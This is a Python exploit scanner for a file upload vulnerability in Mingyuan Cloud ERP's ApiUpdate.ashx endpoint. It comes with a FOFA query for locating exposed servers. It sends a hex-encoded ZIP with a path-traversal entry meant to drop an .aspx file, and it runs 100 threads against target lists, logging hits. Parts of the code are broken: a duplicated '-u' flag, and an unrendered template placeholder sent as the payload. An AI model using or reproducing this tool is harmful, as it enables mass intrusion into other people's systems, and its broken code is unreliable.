#fofa : body="hibot.js" || title="明源云ERP" 或者 body="接口管家站点正常！"

import argparse, requests, sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """

        ███╗   ███╗██╗███╗   ██╗ ██████╗██╗   ██╗██╗   ██╗ █████╗ ███╗   ██╗██╗   ██╗██╗   ██╗███╗   ██╗
        ████╗ ████║██║████╗  ██║██╔════╝╚██╗ ██╔╝██║   ██║██╔══██╗████╗  ██║╚██╗ ██╔╝██║   ██║████╗  ██║
        ██╔████╔██║██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║███████║██╔██╗ ██║ ╚████╔╝ ██║   ██║██╔██╗ ██║
        ██║╚██╔╝██║██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██╔══██║██║╚██╗██║  ╚██╔╝  ██║   ██║██║╚██╗██║
        ██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚████║
        ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝                                                                                               
                                                                                                        author:秋妤
                                                                                                        date:2024.09.26
                                                                                                        version:1.0 
"""
    print(test)


def poc(target):
    api_payload = "/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"
    headers = {
        "Accept-Encoding": "gzip",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Length": "856"
    }
    data = "{{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}}"

    try:
        response1 = requests.get(url=target, verify=False)
        response2 = requests.post(url=target + api_payload, verify=False, timeout=5, headers=headers, json=data)
        if response1.status_code == 200:
            if response2.status_code == 200 and "Message" in response2.text:
                print(f"[+]{target} 存在文件上传漏洞")
                with open('明源云_result.txt', 'a',encoding='utf-8') as fp:
                    fp.write(target + '\n')
            else:
                print(f"[-]{target} 不存在文件上传漏洞")
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[*]{target} 无法访问")

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 明源云 ERP ApiUpdate.ashx 文件上传漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
